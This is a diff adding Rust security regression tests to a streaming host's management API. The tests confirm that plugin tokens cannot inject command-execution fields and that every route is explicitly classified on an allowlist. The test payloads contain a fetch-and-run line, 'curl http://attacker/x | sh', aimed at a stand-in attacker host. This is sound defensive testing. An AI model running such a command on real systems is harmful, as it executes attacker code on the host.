@@ -1042,6 +1042,297 @@ async fn plugin_log_ingest_lands_in_the_ring() {
     assert_eq!(status, StatusCode::BAD_REQUEST);
 }
 
+/// **The plugin lane reaches the library writes but cannot make them run a command** — the H-1 fix.
+///
+/// A provider plugin must be able to reconcile its own entry set, so the ROUTE stays open to it.
+/// What is refused is the pair of fields inside the payload that the host later executes verbatim as
+/// the host user (`/bin/sh -c` on Linux, `cmd.exe /c` on Windows): `prep`, and a `command` launch.
+/// Those are the operator's authority, and the whole trust argument at their execution sites is that
+/// a human typed them into the admin console.
+#[tokio::test]
+async fn plugin_lane_cannot_set_command_execution_fields() {
+    let app = test_app(test_state(), None); // admin "test-secret", plugin "plugin-secret"
+
+    let as_lane = |token: &str, method: &str, path: &str, body: serde_json::Value| {
+        axum::http::Request::builder()
+            .method(method)
+            .uri(path)
+            .header("content-type", "application/json")
+            .header("authorization", format!("Bearer {token}"))
+            .body(Body::from(body.to_string()))
+            .unwrap()
+    };
+
+    // The two shapes of the primitive, on the two routes that carry it.
+    let prep = serde_json::json!({
+        "title": "Pwned",
+        "prep": [{"do": "curl http://attacker/x | sh"}],
+    });
+    let command = serde_json::json!({
+        "title": "Pwned",
+        "launch": {"kind": "command", "value": "curl http://attacker/x | sh"},
+    });
+    for (path, method) in [
+        ("/api/v1/library/custom", "POST"),
+        ("/api/v1/library/custom/some-id", "PUT"),
+    ] {
+        for body in [&prep, &command] {
+            let (status, err) =
+                send(&app, as_lane("plugin-secret", method, path, body.clone())).await;
+            assert_eq!(
+                status,
+                StatusCode::FORBIDDEN,
+                "plugin token must not set an executed field via {method} {path}"
+            );
+            assert!(
+                err["error"].as_str().unwrap().contains("host user"),
+                "the refusal should say why: {err}"
+            );
+        }
+    }
+    // The reconcile route replaces a WHOLE entry set, so every entry is checked — not just the
+    // first. A payload that hides the primitive behind a benign leading entry is still refused.
+    let sneaky = serde_json::json!([
+        {"external_id": "a", "title": "Innocent"},
+        {"external_id": "b", "title": "Pwned",
+         "launch": {"kind": "command", "value": "curl http://attacker/x | sh"}},
+    ]);
+    let (status, _) = send(
+        &app,
+        as_lane(
+            "plugin-secret",
+            "PUT",
+            "/api/v1/library/provider/romm",
+            sneaky,
+        ),
+    )
+    .await;
+    assert_eq!(
+        status,
+        StatusCode::FORBIDDEN,
+        "a privileged field anywhere in a reconcile payload must be refused"
+    );
+
+    // Every refusal above happens BEFORE the catalog is touched, so this test never writes to the
+    // host config dir. The converse — that the operator's own lane may set these fields, and that a
+    // plugin's ordinary catalogue is unaffected — is `library::tests::privileged_field_is_command_
+    // execution_only`, which needs no filesystem either.
+    assert!(
+        crate::mgmt::auth::AuthLane::Admin.may_set_privileged_fields(),
+        "the operator's token is the lane these fields belong to"
+    );
+    assert!(!crate::mgmt::auth::AuthLane::Plugin.may_set_privileged_fields());
+    assert!(!crate::mgmt::auth::AuthLane::Cert.may_set_privileged_fields());
+}
+
+/// **Every route in the live table is explicitly classified for both non-admin lanes.**
+///
+/// This is the test whose absence produced H-1 and H-2 in the 2026-08-05 review. `plugin_may_access`
+/// used to be a denylist, so a route added after the list was written was granted to the plugin
+/// token silently and no test failed — which is exactly how `/api/v1/library`'s two copies of the
+/// command-execution primitive, and the unconfined art proxy, ended up on the plugin lane across
+/// ~1450 commits.
+///
+/// The gate is an allowlist now, so the failure mode has flipped: a new route is DENIED until it is
+/// classified. This test makes that classification a conscious, reviewed act rather than a silent
+/// default in either direction — adding a route fails the build until its row is added here, and the
+/// row is where a reviewer looks to ask "should a plugin really reach this?".
+#[test]
+fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
+    use axum::http::Method;
+
+    // (method, path template, plugin token may reach, paired streaming cert may reach).
+    // EXHAUSTIVE over the live route table — no wildcards, no prefixes, one row per operation.
+    const EXPECTED: &[(&str, &str, bool, bool)] = &[
+        // ---- host / status: readable by a plugin; the small read-only set is the cert lane's.
+        ("GET", "/api/v1/health", true, false), // always open, handled before either gate
+        ("GET", "/api/v1/host", true, true),
+        ("GET", "/api/v1/status", true, true),
+        ("GET", "/api/v1/local/summary", true, false), // loopback-only, handled before the gates
+        ("GET", "/api/v1/compositors", true, true),
+        ("GET", "/api/v1/events", true, false),
+        ("GET", "/api/v1/logs", true, false),
+        // ---- paired-device rosters: readable by a plugin, never by another paired client, and
+        // removal is pairing administration in both lanes.
+        ("GET", "/api/v1/clients", true, false),
+        ("DELETE", "/api/v1/clients/{fingerprint}", false, false),
+        ("GET", "/api/v1/native/clients", true, false),
+        (
+            "DELETE",
+            "/api/v1/native/clients/{fingerprint}",
+            false,
+            false,
+        ),
+        // ---- pairing administration + PIN visibility: the operator's token alone.
+        ("GET", "/api/v1/pair", false, false),
+        ("POST", "/api/v1/pair/pin", false, false),
+        ("GET", "/api/v1/native/pair", false, false),
+        ("DELETE", "/api/v1/native/pair", false, false),
+        ("POST", "/api/v1/native/pair/arm", false, false),
+        ("GET", "/api/v1/native/pending", false, false),
+        ("POST", "/api/v1/native/pending/{id}/approve", false, false),
+        ("POST", "/api/v1/native/pending/{id}/deny", false, false),
+        // ---- GPU + display: host configuration, no privilege boundary.
+        ("GET", "/api/v1/gpus", true, false),
+        ("PUT", "/api/v1/gpus/preference", true, false),
+        ("GET", "/api/v1/display/settings", true, false),
+        ("PUT", "/api/v1/display/settings", true, false),
+        ("GET", "/api/v1/display/state", true, false),
+        ("GET", "/api/v1/display/monitors", true, false),
+        ("PUT", "/api/v1/display/layout", true, false),
+        ("POST", "/api/v1/display/release", true, false),
+        ("GET", "/api/v1/display/presets", true, false),
+        ("POST", "/api/v1/display/presets", true, false),
+        ("PUT", "/api/v1/display/presets/{id}", true, false),
+        ("DELETE", "/api/v1/display/presets/{id}", true, false),
+        // ---- session control.
+        ("DELETE", "/api/v1/session", true, false),
+        ("POST", "/api/v1/session/idr", true, false),
+        ("GET", "/api/v1/session/settings", true, false),
+        ("PUT", "/api/v1/session/settings", true, false),
+        ("POST", "/api/v1/game/end", true, false),
+        // ---- library. The plugin lane reaches the writes (a scanner plugin's whole job), but the
+        // operator-privileged FIELDS inside those payloads are refused in the handler — see
+        // `plugin_lane_cannot_set_command_execution_fields`.
+        ("GET", "/api/v1/library", true, true),
+        ("GET", "/api/v1/library/art/{id}/{kind}", true, true),
+        ("GET", "/api/v1/library/scanners", true, false),
+        ("PUT", "/api/v1/library/scanners/{id}", true, false),
+        ("POST", "/api/v1/library/custom", true, false),
+        ("PUT", "/api/v1/library/custom/{id}", true, false),
+        ("DELETE", "/api/v1/library/custom/{id}", true, false),
+        ("PUT", "/api/v1/library/provider/{provider}", true, false),
+        ("DELETE", "/api/v1/library/provider/{provider}", true, false),
+        // ---- stats.
+        ("POST", "/api/v1/stats/capture/start", true, false),
+        ("POST", "/api/v1/stats/capture/stop", true, false),
+        ("GET", "/api/v1/stats/capture/status", true, false),
+        ("GET", "/api/v1/stats/capture/live", true, false),
+        ("GET", "/api/v1/stats/recordings", true, false),
+        ("GET", "/api/v1/stats/recordings/{id}", true, false),
+        ("DELETE", "/api/v1/stats/recordings/{id}", true, false),
+        // ---- plugins: its own directory entry and log ingest, never another plugin's UI secret.
+        ("GET", "/api/v1/plugins", true, false),
+        ("POST", "/api/v1/plugins/logs", true, false),
+        ("PUT", "/api/v1/plugins/{id}", true, false),
+        ("DELETE", "/api/v1/plugins/{id}", true, false),
+        ("GET", "/api/v1/plugins/{id}/ui-credential", false, false),
+        // ---- hooks: writing is command execution as the host user; reading exposes webhook creds.
+        ("GET", "/api/v1/hooks", false, false),
+        ("PUT", "/api/v1/hooks", false, false),
+        // ---- the store: installing a plugin runs new code with operator privileges.
+        ("GET", "/api/v1/store/catalog", false, false),
+        ("POST", "/api/v1/store/refresh", false, false),
+        ("GET", "/api/v1/store/installed", false, false),
+        ("POST", "/api/v1/store/install", false, false),
+        ("POST", "/api/v1/store/uninstall", false, false),
+        ("GET", "/api/v1/store/jobs", false, false),
+        ("GET", "/api/v1/store/jobs/{id}", false, false),
+        ("GET", "/api/v1/store/sources", false, false),
+        ("PUT", "/api/v1/store/sources/{name}", false, false),
+        ("DELETE", "/api/v1/store/sources/{name}", false, false),
+        ("GET", "/api/v1/store/runtime", false, false),
+        ("POST", "/api/v1/store/runtime", false, false),
+        // ---- updates: `apply` runs an installer / the root helper.
+        ("GET", "/api/v1/update/status", false, false),
+        ("POST", "/api/v1/update/check", false, false),
+        ("POST", "/api/v1/update/apply", false, false),
+    ];
+
+    /// A path template's concrete form: every `{param}` segment becomes a literal, so the gates
+    /// are exercised on the shape a real request has.
+    fn concrete(template: &str) -> String {
+        template
+            .split('/')
+            .map(|s| if s.starts_with('{') { "sample" } else { s })
+            .collect::<Vec<_>>()
+            .join("/")
+    }
+
+    let doc: serde_json::Value = serde_json::from_str(&openapi_json()).unwrap();
+    let mut live: Vec<(String, String)> = Vec::new();
+    for (path, ops) in doc["paths"].as_object().unwrap() {
+        for method in ops.as_object().unwrap().keys() {
+            if matches!(method.as_str(), "get" | "post" | "put" | "delete" | "patch") {
+                live.push((method.to_uppercase(), path.clone()));
+            }
+        }
+    }
+
+    // 1. Every LIVE route has a classification row. A new route fails here until it gets one.
+    for (method, path) in &live {
+        assert!(
+            EXPECTED
+                .iter()
+                .any(|(m, p, _, _)| m == method && p == path),
+            "route {method} {path} has no lane classification — add a row to EXPECTED in this test \
+             and decide, deliberately, whether the plugin token and a paired streaming cert may \
+             reach it"
+        );
+    }
+    // 2. No STALE rows: a removed route must not leave a classification behind claiming coverage.
+    for (method, path, _, _) in EXPECTED {
+        assert!(
+            live.iter().any(|(m, p)| m == method && p == path),
+            "EXPECTED lists {method} {path}, which is not in the live route table — remove the row"
+        );
+    }
+    // 3. The gates agree with the classification, on both lanes.
+    for (method, path, plugin_ok, cert_ok) in EXPECTED {
+        let m = Method::from_bytes(method.as_bytes()).unwrap();
+        let concrete = concrete(path);
+        assert_eq!(
+            auth::plugin_may_access(&m, &concrete),
+            *plugin_ok,
+            "plugin lane: {method} {path} should be {}",
+            if *plugin_ok { "reachable" } else { "denied" }
+        );
+        assert_eq!(
+            auth::cert_may_access(&m, &concrete),
+            *cert_ok,
+            "cert lane: {method} {path} should be {}",
+            if *cert_ok { "reachable" } else { "denied" }
+        );
+    }
+}
+
+/// The allowlist is segment-wise, so a route that merely *starts with* an allowed one is not
+/// swallowed by it — the failure that a `starts_with` denylist/allowlist invites.
+#[test]
+fn plugin_allowlist_matches_whole_segments_only() {
+    use axum::http::Method;
+    // The UI credential sits one segment below an allowed route and must stay denied.
+    assert!(auth::plugin_may_access(
+        &Method::PUT,
+        "/api/v1/plugins/rom-manager"
+    ));
+    assert!(!auth::plugin_may_access(
+        &Method::GET,
+        "/api/v1/plugins/rom-manager/ui-credential"
+    ));
+    // A hypothetical future sub-route of an allowed route is denied until classified.
+    assert!(!auth::plugin_may_access(
+        &Method::GET,
+        "/api/v1/library/secrets"
+    ));
+    assert!(!auth::plugin_may_access(
+        &Method::POST,
+        "/api/v1/session/settings/x"
+    ));
+    // Method matters: the roster is readable, its removal is not.
+    assert!(auth::plugin_may_access(&Method::GET, "/api/v1/clients"));
+    assert!(!auth::plugin_may_access(
+        &Method::DELETE,
+        "/api/v1/clients/aabbcc"
+    ));
+    // A path prefix that is not a segment prefix must not match at all.
+    assert!(!auth::plugin_may_access(&Method::GET, "/api/v1/statuses"));
+    assert!(!auth::plugin_may_access(
+        &Method::GET,
+        "/api/v1/library-secrets"
+    ));
+}
+
 /// The OpenAPI document lists every route with a unique operationId (codegen relies
 /// on both), and the checked-in copy is current.
 #[test]
